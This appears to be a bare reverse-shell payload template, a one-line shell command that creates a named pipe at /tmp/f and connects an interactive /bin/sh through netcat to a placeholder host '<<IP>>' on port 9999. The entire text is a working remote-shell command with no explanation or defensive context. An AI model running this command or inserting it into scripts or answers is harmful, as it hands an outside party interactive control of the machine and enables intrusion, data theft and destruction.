rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -ip 2>&1|nc <<IP>> 9999 >/tmp/f
